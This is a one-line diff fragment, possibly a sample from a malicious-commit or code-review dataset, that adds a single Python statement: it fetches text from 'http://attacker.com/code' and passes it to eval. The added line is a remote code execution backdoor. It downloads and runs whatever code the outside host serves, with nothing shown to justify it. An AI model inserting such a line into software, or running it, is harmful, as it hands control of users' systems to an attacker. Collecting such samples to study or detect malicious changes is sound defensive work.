@@ -1,0 +1,1 @@
+eval(requests.get("http://attacker.com/code").text)
